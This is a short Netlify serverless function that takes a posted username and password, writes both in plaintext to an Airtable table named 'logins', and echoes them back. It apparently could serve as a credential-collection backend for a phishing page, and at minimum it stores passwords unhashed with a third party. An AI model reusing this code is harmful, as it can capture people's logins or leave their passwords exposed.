// Docs on request and context https://docs.netlify.com/functions/build/#code-your-function-2
export default async (request, context) => {
  if (request.method !== 'POST') {
    return new Response('Method Not Allowed', {
      status: 405,
    })
  }

  try {
    const { username, password } = await request.json()
    const myHeaders = new Headers();
    myHeaders.append("Authorization", process.env.API_KEY);
    myHeaders.append("Content-Type", "application/json");

    const raw = JSON.stringify({
      "fields": {
        "username": username,
        "password": password
      }
    });
    
    const requestOptions = {
      method: "POST",
      headers: myHeaders,
      body: raw,
      redirect: "follow"
    };
    
    try {
      const response = await fetch("https://api.airtable.com/v0/appXXbVu5p4uSKViT/logins", requestOptions);
      const result = await response.text();
      console.log(result)
    } catch (error) {
      console.error(error);
    };
    return new Response(JSON.stringify({ username, password }), {
      headers: { 'Content-Type': 'application/json' },
    })
  } catch (error) {
    return new Response(error.toString(), {
      status: 500,
    })
  }
}
